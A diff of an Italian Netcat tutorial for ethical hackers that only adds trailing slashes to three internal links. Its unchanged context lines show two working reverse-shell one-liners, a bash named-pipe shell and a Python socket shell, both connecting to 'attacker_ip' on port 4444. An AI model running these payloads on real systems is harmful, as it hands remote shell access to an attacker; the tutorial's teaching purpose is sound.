@@ -166,7 +166,7 @@ Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
 Connection to 192.168.1.100 80 port [tcp/http] succeeded!
 ```
 
-Netcat è perfetto per verifiche rapide, ma per un **port scanning professionale** con detection di servizi e vulnerabilità, **\[[Nmap](https://hackita.it/articoli/nmap)]** rimane lo strumento di riferimento per ogni ethical hacker.
+Netcat è perfetto per verifiche rapide, ma per un **port scanning professionale** con detection di servizi e vulnerabilità, **\[[Nmap](https://hackita.it/articoli/nmap/)]** rimane lo strumento di riferimento per ogni ethical hacker.
 
 ### Testing Connettività TCP/UDP
 
@@ -312,7 +312,7 @@ cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-Dopo aver ottenuto accesso con Netcat, passa a **\[[Metasploit](https://hackita.it/articoli/metasploit)]** per post-exploitation avanzato, lateral movement e persistence.
+Dopo aver ottenuto accesso con Netcat, passa a **\[[Metasploit](https://hackita.it/articoli/metasploit/)]** per post-exploitation avanzato, lateral movement e persistence.
 
 ## Scenari Operativi Avanzati
 
@@ -351,7 +351,7 @@ nc -l -p 8080 | tee traffic_log.txt | nc remote_host 80
 
 Ogni pacchetto viene salvato mentre viene inoltrato, permettendo analisi post-mortem.
 
-Per analizzare il traffico sospetto generato da Netcat, usa **\[[Wireshark](https://hackita.it/articoli/wireshark)]**. La nostra guida ti mostra come filtrare e identificare attività malevole.
+Per analizzare il traffico sospetto generato da Netcat, usa **\[[Wireshark](https://hackita.it/articoli/wireshark/)]**. La nostra guida ti mostra come filtrare e identificare attività malevole.
 
 ### Bypass Proxy e Tunneling
 
